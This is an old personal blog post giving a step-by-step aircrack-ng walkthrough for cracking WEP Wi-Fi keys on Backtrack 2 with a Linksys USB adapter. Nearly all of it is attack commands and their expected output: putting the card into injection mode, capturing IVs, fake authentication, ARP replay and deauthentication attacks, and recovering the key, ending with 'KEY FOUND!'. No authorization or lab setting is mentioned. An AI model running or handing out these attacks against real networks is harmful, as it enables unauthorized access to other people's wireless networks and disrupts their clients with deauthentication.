---
id: 84
title: Yet another aircrack-ng guide
date: 2007-12-28T02:25:01
slug: yet-another-aircrack-ng-guide
type: post
path: /2007/12/28/yet-another-aircrack-ng-guide/
link: "https://jiehong.org/2007/12/28/yet-another-aircrack-ng-guide/"
---

# Yet another aircrack-ng guide

I managed to get hold of a Linksys WUSB54GC USB wireless-g adapter and a burnt copy of Backtrack 2 with [Aircrack-ng](http://www.aircrack-ng.org/).

So let’s get started then..Back Track 2 loaded with the rt73 drivers.

The following commands is to get your WUSB54GC dongle into the monitor/injection mode.

“ifconfig rausb0 up”

“iwconfig rausb0 mode monitor channel 1 rate 1M”

“iwpriv rausb0 forceprism 1”

“iwpriv rausb0 rfmontx 1”

I have yet to find out what those iwpriv does other than turning on some private IO controls within the card or drivers.

To verify that your card is ready for injecting, execute “aireplay-ng –test rausb0”

You should see the following:

Trying broadcast probe requests…

Injection is working!

Found 15 APs

Now we are ready, open the first console and execute the following command

“airodump-ng –ivs -w capture –encrypt wep -a rausb0”

and it  will return with a list of APs by BSSID, PWR, CH, ESSID and other interesting fields and data dumped to a capture-0x.ivs

Once you have determine your target, you may want to re-run airodump and filter by the BSSID or leave the command running to collect the IVs.

Next, we will execute a series of commands in different consoles together.

The fakeauth attack “aireplay-ng –fakeauth 10 -e MySSID -a 00:XX:XX:XX:XX:XX -h 00:11:22:33:44:55 rausb0”

You should see the following:

Waiting for beacon frame (BSSID: 00:XX:XX:XX:XX:XX)

Sending Authentication Request

Authentication successful

Sending Association Request

Association successful 🙂

The ARP replay attack “aireplay-ng –arpreplay -e <ESSID> -b <BSSID> -h 00:11:22:33:44:55 rausb0”

You should see the following:

Saving ARP requests in replay_arp-xxxxx.cap

You should also start airodump-ng to capture replies.

Read 53965 packets (got 31064 ARP requests), sent 48076 packets…(319 pps)

Here’s the part where I don’t get it.

Sometimes you have to run a deauth attack to get some ARP packets coming, sometimes I don’t need to.

aireplay-ng –deauth 10 -e MySSID -a <00:XX:XX:XX:XX:XX> -h 00:11:22:33:44:55 rausb0

Finally after collecting about 100k for 64bit WEP till 500k for 128bit WEP of IV packets, you may execute “aircrack-ng -b 00:XX:XX:XX:XX:XX capture-0x.ivs”

You should see the following:

[00:00:00] Tested 1 keys (got 208713 IVs)

KB    depth   byte(vote)

0    0/  1   XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX)

0    0/  2   XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX)

.

.

0    0/  5   XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX) XX(  XX)

KEY FOUND! [ XX:XX:XX:XX:XX ]

Decrypted correctly: 100%
